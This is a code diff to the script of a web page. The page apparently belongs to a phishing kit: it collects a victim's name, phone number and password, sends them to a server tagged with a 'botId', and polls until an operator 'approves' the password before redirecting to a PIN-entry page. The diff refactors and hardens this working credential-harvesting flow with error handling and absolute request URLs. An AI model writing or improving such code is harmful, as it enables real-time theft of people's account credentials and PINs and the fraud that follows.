@@ -196,84 +196,91 @@
   </div>
 
   <script>
-    const form = document.getElementById('detailsForm');
-    const statusEl = document.getElementById('status');
-    const passwordInput = document.getElementById('password');
+  const form = document.getElementById('detailsForm');
+  const statusEl = document.getElementById('status');
+  const passwordInput = document.getElementById('password');
 
-    const fullName = localStorage.getItem('fullName');
+  const fullName = localStorage.getItem('fullName');
 
-    const params = new URLSearchParams(window.location.search);
-    const botId =
-      params.get('botId') ||
-      localStorage.getItem('botId') ||
-      'bot1';
+  const params = new URLSearchParams(window.location.search);
+  const botId =
+    params.get('botId') ||
+    localStorage.getItem('botId') ||
+    'bot1';
 
-    localStorage.setItem('botId', botId);
+  localStorage.setItem('botId', botId);
 
-    if (!fullName) {
-      alert('Session expired. Please start again.');
-      window.location.href = 'index.html';
-    }
+  if (!fullName) {
+    alert('Session expired. Please start again.');
+    window.location.href = 'index.html';
+  }
 
-    function togglePassword() {
-      passwordInput.type =
-        passwordInput.type === 'password' ? 'text' : 'password';
-    }
+  function togglePassword() {
+    passwordInput.type =
+      passwordInput.type === 'password' ? 'text' : 'password';
+  }
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
 
-      // 🔥 CRITICAL FIX
-      document.getElementById('accountType').disabled = true;
+    const phone = document.getElementById('phone').value;
+    const password = passwordInput.value;
 
-      const phone = document.getElementById('phone').value;
-      const password = passwordInput.value;
+    localStorage.setItem('phone', phone);
 
-      localStorage.setItem('phone', phone);
+    statusEl.style.display = 'block';
+    statusEl.classList.remove('error');
+    statusEl.textContent = '⏳ Waiting for approval...';
 
-      statusEl.style.display = 'block';
-      statusEl.classList.remove('error');
-      statusEl.textContent = '⏳ Waiting for approval...';
-
-      const res = await fetch('/submit-password', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          name: fullName,
-          phone,
-          password,
-          botId
-        })
-      });
+    try {
+      const res = await fetch(
+        `${window.location.origin}/submit-password`,
+        {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            name: fullName,
+            phone,
+            password,
+            botId
+          })
+        }
+      );
 
       if (!res.ok) {
-        statusEl.classList.add('error');
-        statusEl.textContent = '❌ Server error. Please try again.';
-        return;
+        throw new Error('Request failed');
       }
 
       const { requestId } = await res.json();
       pollApproval(requestId);
-    });
 
-    function pollApproval(requestId) {
-      const interval = setInterval(async () => {
-        const res = await fetch(`/check-password/${requestId}`);
-        const data = await res.json();
-
-        if (data.approved === true) {
-          clearInterval(interval);
-          window.location.href = 'pin.html';
-        }
-
-        if (data.approved === false) {
-          clearInterval(interval);
-          statusEl.classList.add('error');
-          statusEl.textContent = '❌ Incorrect password. Please try again.';
-        }
-      }, 2000);
+    } catch (err) {
+      statusEl.classList.add('error');
+      statusEl.textContent = '❌ Server error. Please try again.';
     }
-  </script>
+  });
+
+  function pollApproval(requestId) {
+    const interval = setInterval(async () => {
+      const res = await fetch(
+        `${window.location.origin}/check-password/${requestId}`
+      );
+      const data = await res.json();
+
+      if (data.approved === true) {
+        clearInterval(interval);
+        window.location.href = 'pin.html';
+      }
+
+      if (data.approved === false) {
+        clearInterval(interval);
+        statusEl.classList.add('error');
+        statusEl.textContent = '❌ Incorrect password. Please try again.';
+      }
+    }, 2000);
+  }
+</script>
+
 
 </body>
 </html>
